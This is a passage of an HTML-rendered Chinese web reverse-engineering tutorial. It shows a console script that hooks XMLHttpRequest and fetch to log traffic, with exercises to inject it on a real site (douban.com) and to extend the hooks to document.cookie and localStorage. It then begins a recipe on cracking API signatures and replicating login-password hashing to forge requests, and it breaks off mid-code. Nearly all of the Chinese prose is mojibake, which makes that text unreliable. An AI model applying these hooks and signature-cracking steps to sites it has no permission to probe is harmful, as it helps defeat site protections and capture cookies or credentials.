<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">method</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalXHROpen</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¤ [XHR è¯·æ±‚]&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_method</span><span class="p">,</span>
<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="p">,</span>
<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nx">body</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// Hook å“åº”</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ [XHR å“åº”]&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="p">,</span>
<span class="w">                </span><span class="nx">status</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span>
<span class="w">                </span><span class="nx">response</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;...&#39;</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalXHRSend</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook Fetch API</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¤ [Fetch è¯·æ±‚]&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">],</span>
<span class="w">            </span><span class="nx">options</span><span class="o">:</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ [Fetch å“åº”]&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span>
<span class="w">                </span><span class="nx">status</span><span class="o">:</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="c1">// Clone response é¿å…æ¶ˆè€—å®ƒ</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">().</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">body</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ [Fetch å†…å®¹]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… Hook å®‰è£…æˆåŠŸï¼ç°åœ¨æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«è®°å½•ã€‚&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <ol start="2">
        <li>
          <p><strong>ç²˜è´´åˆ° Console ä¸­</strong></p>
        </li>
        <li>
          <p><strong>æŒ‰ Enter é”®æ‰§è¡Œ</strong></p>
        </li>
      </ol>

      <p>âœ… <strong>éªŒè¯</strong>: ä½ åº”è¯¥çœ‹åˆ°æ¶ˆæ¯ &#8220;âœ… Hook å®‰è£…æˆåŠŸï¼ç°åœ¨æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«è®°å½•ã€‚&#8221;</p>

      <hr />

      <h3 id="step-3-è§¦å‘è¯·æ±‚å¹¶è§‚å¯Ÿ">Step 3: è§¦å‘è¯·æ±‚å¹¶è§‚å¯Ÿ</h3>

      <ol>
        <li>
          <p><strong>åœ¨æµ‹è¯•ç½‘ç«™ä¸­ç‚¹å‡»ç¤ºä¾‹é“¾æ¥</strong>:</p>

          <ul>
            <li>ç‚¹å‡» <code>/posts</code></li>
            <li>ç‚¹å‡» <code>/comments</code></li>
            <li>ç‚¹å‡» <code>/users</code></li>
          </ul>
        </li>
        <li>
          <p><strong>è§‚å¯Ÿ Console è¾“å‡º</strong>:</p>
        </li>
      </ol>

      <p>ä½ ä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š</p>

      <pre><code>ğŸ“¤ [Fetch è¯·æ±‚] {url: "https://jsonplaceholder.typicode.com/posts", options: undefined}
ğŸ“¥ [Fetch å“åº”] {url: "https://jsonplaceholder.typicode.com/posts", status: 200}
ğŸ“¥ [Fetch å†…å®¹] [{"userId":1,"id":1,"title":"sunt aut facere...
</code></pre>

      <ol start="3">
        <li><strong>åˆ†æè¾“å‡ºä¿¡æ¯</strong>:
          <ul>
            <li>ğŸ“¤ è¡¨ç¤ºå‘é€çš„è¯·æ±‚</li>
            <li>ğŸ“¥ è¡¨ç¤ºæ”¶åˆ°çš„å“åº”</li>
            <li>å¯ä»¥çœ‹åˆ° URLã€HTTP æ–¹æ³•ã€çŠ¶æ€ç ã€å“åº”å†…å®¹</li>
          </ul>
        </li>
      </ol>

      <p>âœ… <strong>éªŒè¯</strong>: æ¯æ¬¡ç‚¹å‡»é“¾æ¥éƒ½èƒ½åœ¨ Console çœ‹åˆ°è¯·æ±‚å’Œå“åº”è®°å½•</p>

      <hr />

      <h3 id="step-4-ä¿å­˜å’Œå¯¼å‡ºæ•°æ®">Step 4: ä¿å­˜å’Œå¯¼å‡ºæ•°æ®</h3>

      <ol>
        <li><strong>å³é”® Console è¾“å‡º</strong></li>
        <li><strong>é€‰æ‹© &#8220;Save as&#8230;"</strong></li>
        <li><strong>ä¿å­˜ä¸º <code>network_log.txt</code></strong></li>
      </ol>

      <p>ç°åœ¨ä½ æœ‰äº†æ‰€æœ‰è¯·æ±‚çš„å®Œæ•´è®°å½•ï¼</p>

      <hr />

      <h2 id="éªŒè¯æ¸…å•">âœ… éªŒè¯æ¸…å•</h2>

      <p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> Console ä¸­çœ‹åˆ° &#8220;âœ… Hook å®‰è£…æˆåŠŸï¼&#8221;</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> ç‚¹å‡»é“¾æ¥åèƒ½çœ‹åˆ° ğŸ“¤ å’Œ ğŸ“¥ çš„æ—¥å¿—</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æ—¥å¿—ä¸­åŒ…å« URL å’ŒçŠ¶æ€ç </li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> èƒ½çœ‹åˆ°å“åº”å†…å®¹çš„å‰200ä¸ªå­—ç¬¦</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æˆåŠŸä¿å­˜äº†æ—¥å¿—æ–‡ä»¶</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶ç»ƒä¹ ">ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>

      <h3 id="ç»ƒä¹ 1-hook-å…¶ä»–ç½‘ç«™">ç»ƒä¹ 1: Hook å…¶ä»–ç½‘ç«™</h3>

      <p>å°è¯•åœ¨çœŸå®ç½‘ç«™ä¸Šä½¿ç”¨è¿™ä¸ª Hookï¼š</p>

      <ol>
        <li>è®¿é—® <a href="https://www.douban.com/">https://www.douban.com/</a></li>
        <li>æ³¨å…¥åŒæ ·çš„ Hook ä»£ç </li>
        <li>åˆ·æ–°é¡µé¢ï¼Œè§‚å¯Ÿæ‰€æœ‰è¯·æ±‚</li>
      </ol>

      <p><strong>æ€è€ƒ</strong>: ä½ èƒ½çœ‹åˆ°å“ªäº›æœ‰è¶£çš„ API è¯·æ±‚ï¼Ÿ</p>

      <h3 id="ç»ƒä¹ 2-ä¿®æ”¹-hook-è„šæœ¬">ç»ƒä¹ 2: ä¿®æ”¹ Hook è„šæœ¬</h3>

      <p>å°è¯•ä¿®æ”¹ä»£ç ï¼Œæ·»åŠ æ›´å¤šåŠŸèƒ½ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªè®°å½•åŒ…å«ç‰¹å®šå…³é”®è¯çš„è¯·æ±‚</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/api/&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¤ API è¯·æ±‚&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_url</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="ç»ƒä¹ 3-ç»Ÿè®¡è¯·æ±‚æ•°é‡">ç»ƒä¹ 3: ç»Ÿè®¡è¯·æ±‚æ•°é‡</h3>

      <p>æ·»åŠ è®¡æ•°å™¨ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">requestCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="c1">// åœ¨å‘é€è¯·æ±‚æ—¶</span>
<span class="nx">requestCount</span><span class="o">++</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“Š æ€»è¯·æ±‚æ•°: </span><span class="si">${</span><span class="nx">requestCount</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">â— å¸¸è§é—®é¢˜</h2>

      <h3 id="q1-åˆ·æ–°é¡µé¢å-hook-å¤±æ•ˆäº†">Q1: åˆ·æ–°é¡µé¢å Hook å¤±æ•ˆäº†ï¼Ÿ</h3>

      <p><strong>A</strong>: æ˜¯çš„ï¼Hook æ˜¯æ³¨å…¥åˆ°å½“å‰é¡µé¢çš„ JavaScript ç¯å¢ƒä¸­çš„ï¼Œåˆ·æ–°é¡µé¢ä¼šæ¸…ç©ºæ‰€æœ‰å†…å®¹ã€‚</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>æ¯æ¬¡åˆ·æ–°åé‡æ–°æ‰§è¡Œ Hook ä»£ç </li>
        <li>æˆ–è€…ä½¿ç”¨æµè§ˆå™¨æ‰©å±•ï¼ˆå¦‚ Tampermonkeyï¼‰è‡ªåŠ¨æ³¨å…¥</li>
      </ul>

      <h3 id="q2-çœ‹ä¸åˆ°ä»»ä½•è¾“å‡º">Q2: çœ‹ä¸åˆ°ä»»ä½•è¾“å‡ºï¼Ÿ</h3>

      <p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>

      <ol>
        <li>Hook ä»£ç æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼ˆæœ‰æ²¡æœ‰æŠ¥é”™ï¼‰</li>
        <li>ç½‘ç«™æ˜¯å¦çœŸçš„å‘é€äº†è¯·æ±‚ï¼ˆæ£€æŸ¥ Network æ ‡ç­¾ï¼‰</li>
        <li>Console çš„è¿‡æ»¤å™¨æ˜¯å¦è®¾ç½®æ­£ç¡®ï¼ˆç¡®ä¿æ˜¾ç¤ºæ‰€æœ‰æ—¥å¿—ï¼‰</li>
      </ol>

      <h3 id="q3-ä¸ºä»€ä¹ˆæœ‰äº›è¯·æ±‚çœ‹ä¸åˆ°">Q3: ä¸ºä»€ä¹ˆæœ‰äº›è¯·æ±‚çœ‹ä¸åˆ°ï¼Ÿ</h3>

      <p><strong>A</strong>: å¯èƒ½çš„åŸå› ï¼š</p>

      <ul>
        <li>ä½¿ç”¨äº†å…¶ä»–è¯·æ±‚æ–¹å¼ï¼ˆå¦‚ WebSocketï¼‰</li>
        <li>è¯·æ±‚åœ¨ Hook ä»£ç æ³¨å…¥å‰å°±å‘é€äº†</li>
        <li>ä½¿ç”¨äº†åŸç”Ÿçš„ç½‘ç»œ APIï¼ˆéœ€è¦æ›´æ·±å±‚çš„ Hookï¼‰</li>
      </ul>

      <h3 id="q4-hook-ä¼šå½±å“ç½‘ç«™æ­£å¸¸è¿è¡Œå—">Q4: Hook ä¼šå½±å“ç½‘ç«™æ­£å¸¸è¿è¡Œå—ï¼Ÿ</h3>

      <p><strong>A</strong>: æˆ‘ä»¬çš„ Hook ä»£ç åªæ˜¯"ç›‘å¬"ï¼Œä¸ä¿®æ”¹æ•°æ®ï¼Œæ‰€ä»¥<strong>ä¸ä¼šå½±å“</strong>ç½‘ç«™åŠŸèƒ½ã€‚ä½†å¦‚æœ Hook ä»£ç æœ‰bugï¼Œå¯èƒ½å¯¼è‡´é¡µé¢é”™è¯¯ã€‚</p>

      <h3 id="q5-å¦‚ä½•-hook-æ›´å¤šçš„-api">Q5: å¦‚ä½• Hook æ›´å¤šçš„ APIï¼Ÿ</h3>

      <p><strong>A</strong>: åŒæ ·çš„åŸç†å¯ä»¥åº”ç”¨åˆ°ï¼š</p>

      <ul>
        <li><code>localStorage.setItem</code> / <code>getItem</code></li>
        <li><code>document.cookie</code></li>
        <li><code>WebSocket</code></li>
        <li><code>XMLHttpRequest.setRequestHeader</code></li>
      </ul>

      <p>æŸ¥çœ‹ <a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬</a> è·å–æ›´å¤šç¤ºä¾‹ã€‚</p>

      <hr />

      <h2 id="åŸç†è§£æ">ğŸ” åŸç†è§£æ</h2>

      <h3 id="hook-æ˜¯å¦‚ä½•å·¥ä½œçš„">Hook æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. ä¿å­˜åŸå§‹å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="c1">// 2. ç”¨æˆ‘ä»¬çš„å‡½æ•°æ›¿æ¢</span>
<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ‹¦æˆªåˆ°äº†ï¼&#39;</span><span class="p">);</span><span class="w">  </span><span class="c1">// æˆ‘ä»¬çš„ä»£ç </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span><span class="w">  </span><span class="c1">// è°ƒç”¨åŸå‡½æ•°</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>å…³é”®ç‚¹</strong>:</p>

      <ul>
        <li>JavaScript å…è®¸åœ¨è¿è¡Œæ—¶ä¿®æ”¹å‡½æ•°</li>
        <li>æˆ‘ä»¬ç”¨"åŒ…è£…å‡½æ•°"æ›¿æ¢åŸå‡½æ•°</li>
        <li>åŒ…è£…å‡½æ•°å…ˆæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œå†è°ƒç”¨åŸå‡½æ•°</li>
        <li>è¿™æ ·æ—¢èƒ½ç›‘æ§ï¼Œåˆä¸å½±å“åŠŸèƒ½</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³é…æ–¹">ğŸ“š ç›¸å…³é…æ–¹</h2>

      <h3 id="åŸºç¡€é…æ–¹">åŸºç¡€é…æ–¹</h3>

      <ul>
        <li><a href="#03-Basic-Recipes-hooking-techniques">Hook æŠ€æœ¯</a> - Hook çš„æ·±å…¥è®²è§£</li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a> - ä½¿ç”¨æ–­ç‚¹è°ƒè¯•</li>
      </ul>

      <h3 id="é«˜çº§é…æ–¹">é«˜çº§é…æ–¹</h3>

      <ul>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬åˆé›†</a> - æ›´å¤šå³ç”¨å‹ Hook</li>
      </ul>

      <h3 id="ä¸‹ä¸€æ­¥">ä¸‹ä¸€æ­¥</h3>

      <ul>
        <li><a href="#00-Quick-Start-decrypt-api-params">è§£å¯† API å‚æ•°</a> - å­¦ä¹ å¦‚ä½•åˆ†æåŠ å¯†ç®—æ³•</li>
      </ul>

      <hr />

      <h2 id="æ­å–œ">ğŸ‰ æ­å–œï¼</h2>

      <p>ä½ å·²ç»å®Œæˆäº†ç¬¬ä¸€ä¸ª Web é€†å‘é…æ–¹ï¼</p>

      <p>ç°åœ¨ä½ å·²ç»æŒæ¡äº†ï¼š</p>

      <ul>
        <li>âœ… åŸºæœ¬çš„ Hook æŠ€æœ¯</li>
        <li>âœ… å¦‚ä½•ç›‘æ§ç½‘ç»œè¯·æ±‚</li>
        <li>âœ… å¦‚ä½•ä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
      </ul>

      <p><strong>ä¸‹ä¸€æ­¥</strong>: ç»§ç»­å­¦ä¹  <a href="#00-Quick-Start-decrypt-api-params">è§£å¯† API å‚æ•°</a>ï¼ŒæŒæ¡æ›´é«˜çº§çš„æŠ€èƒ½ï¼</p>

      <hr />

      <p><strong>å°è´´å£«</strong>:</p>

      <ul>
        <li>å°†è¿™ä¸ª Hook ä»£ç ä¿å­˜ä¸ºä¹¦ç­¾æˆ– Snippetï¼Œä»¥ä¾¿éšæ—¶ä½¿ç”¨</li>
        <li>å°è¯•åœ¨ä¸åŒç½‘ç«™ä½¿ç”¨ï¼Œè§‚å¯Ÿå®ƒä»¬çš„è¯·æ±‚æ¨¡å¼</li>
        <li>åŠ å…¥é€†å‘å·¥ç¨‹ç¤¾åŒºï¼Œåˆ†äº«ä½ çš„å‘ç°</li>
      </ul>

      <p>Happy Hacking! ğŸ£</p>

    </div>

    <div class="section" id="00-Quick-Start-decrypt-api-params">
      <h2>3. Decrypt API Params</h2>
      <h1 id="é…æ–¹è§£å¯†-api-å‚æ•°">é…æ–¹ï¼šè§£å¯† API å‚æ•°</h1>

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­ (åˆçº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>30-45åˆ†é’Ÿ</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome æµè§ˆå™¨, Python 3.7+</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>ç ´è§£ API ç­¾åã€è§£å¯†è¯·æ±‚å‚æ•°</td>
          </tr>
          <tr>
            <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
            <td>å®Œæˆ <a href="#00-Quick-Start-your-first-hook">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a></td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ä½ å°†å­¦åˆ°">ğŸ¯ ä½ å°†å­¦åˆ°</h2>

      <p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… ä½¿ç”¨ XHR æ–­ç‚¹å®šä½åŠ å¯†å‡½æ•°</li>
        <li>âœ… åˆ†æ JavaScript åŠ å¯†ä»£ç </li>
        <li>âœ… è¯†åˆ«å¸¸è§åŠ å¯†ç®—æ³•ï¼ˆMD5, SHA256, AESç­‰ï¼‰</li>
        <li>âœ… æå–å¯†é’¥å’ŒåŠ å¯†å‚æ•°</li>
        <li>âœ… ç”¨ Python å¤ç°åŠ å¯†é€»è¾‘</li>
        <li>âœ… æ„é€ æœ‰æ•ˆçš„ API è¯·æ±‚</li>
      </ul>

      <hr />

      <h2 id="å‡†å¤‡å·¥ä½œ">ğŸ“ å‡†å¤‡å·¥ä½œ</h2>

      <h3 id="æ£€æŸ¥æ¸…å•">æ£€æŸ¥æ¸…å•</h3>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å®Œæˆäº†"ä½ çš„ç¬¬ä¸€ä¸ª Hook"é…æ–¹</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å·²å®‰è£… Python 3.7+</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å®‰è£…äº† requests åº“:
          <code>pip install requests</code></li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> äº†è§£åŸºæœ¬çš„ Python è¯­æ³•</li>
      </ul>

      <h3 id="å®æˆ˜ç›®æ ‡">å®æˆ˜ç›®æ ‡</h3>

      <p>æˆ‘ä»¬å°†åˆ†æä¸€ä¸ªåŠ å¯†çš„ç™»å½•æ¥å£ï¼Œç›®æ ‡æ˜¯ï¼š</p>

      <ol>
        <li>æ‰¾åˆ°å¯†ç åŠ å¯†å‡½æ•°</li>
        <li>åˆ†æåŠ å¯†ç®—æ³•</li>
        <li>ç”¨ Python å®ç°ç›¸åŒçš„åŠ å¯†</li>
        <li>æˆåŠŸå‘é€ç™»å½•è¯·æ±‚</li>
      </ol>

      <hr />

      <h2 id="æ­¥éª¤è¯¦è§£">ğŸš€ æ­¥éª¤è¯¦è§£</h2>

      <h3 id="step-1-æ‰¾åˆ°åŠ å¯†çš„è¯·æ±‚">Step 1: æ‰¾åˆ°åŠ å¯†çš„è¯·æ±‚</h3>

      <h4 id="11-æ‰“å¼€ç¤ºä¾‹é¡µé¢">1.1 æ‰“å¼€ç¤ºä¾‹é¡µé¢</h4>

      <p>è®¿é—®æ¨¡æ‹Ÿç™»å½•é¡µé¢ï¼ˆä½¿ç”¨æœ¬åœ° HTML æ–‡ä»¶æˆ–åœ¨çº¿ Demoï¼‰ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>ç™»å½•ç¤ºä¾‹<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>ç™»å½•<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;ç”¨æˆ·å&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;admin&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;å¯†ç &quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;123456&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;login()&quot;</span><span class="p">&gt;</span>ç™»å½•<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// åŠ å¯†å¯†ç </span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>

<span class="w">        </span><span class="c1">// ç”Ÿæˆç­¾å</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
